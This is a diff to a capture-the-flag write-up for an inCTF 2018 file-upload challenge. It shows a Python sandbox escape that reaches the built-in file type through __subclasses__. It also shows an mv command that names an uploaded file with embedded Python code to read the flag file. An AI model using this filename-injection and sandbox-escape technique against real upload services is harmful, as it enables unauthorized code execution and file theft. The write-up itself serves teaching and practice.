@@ -6,7 +6,9 @@
 ## Phase: Reconnaissance
 Here we need to figure out how the challenge works, and figure out what we can exploit.
 
-https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/2.png
+
+![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/2.png)
+
 Here we can see it's a file upload. File uploaders are often insecure, let's upload something.
 
 6.png
@@ -103,7 +105,7 @@ Adding () to call the __subclasses__ function.
 >>> getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()[40]
 <type 'file'>
 >>> 
-
+```
 Let's combine our payload and upload it to get the flag.
 ```mv payload.png "print getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()[40]('flag').read()#.png"```
 
